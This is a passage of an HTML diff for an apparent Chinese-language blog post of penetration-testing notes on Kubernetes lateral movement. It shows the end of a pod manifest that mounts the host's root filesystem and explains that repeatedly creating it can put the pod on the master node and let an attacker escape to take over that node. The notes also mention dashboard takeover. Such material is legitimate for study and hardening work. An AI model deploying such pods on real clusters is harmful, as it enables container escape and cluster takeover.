+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      mountPath: /master
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  volumes:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: master
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hostPath:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      path: /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      type: Directory
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><p>这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点</p>
+<h3 id="其他横向">其他横向</h3>
+<p>之前笔记中提到的权限提升阶段的逃逸手法也能用于横向移动，另外，在高权限情况下接管dashboard也能直接在面板下发指令，实现横向</p>
+<h3 id="总结-3">总结</h3>
+<p>可以看到k8s的横向方式都是换汤不换药，无非基于服务、凭证、逃逸、常规内网横向，很多问题都是管理员配置不当产生</p>
+
+  
+
+
+  </main>
+  <footer>
+    <p>Copyright 2025. All rights reserved.</p>
+
+  </footer>
+</body>
+</html>
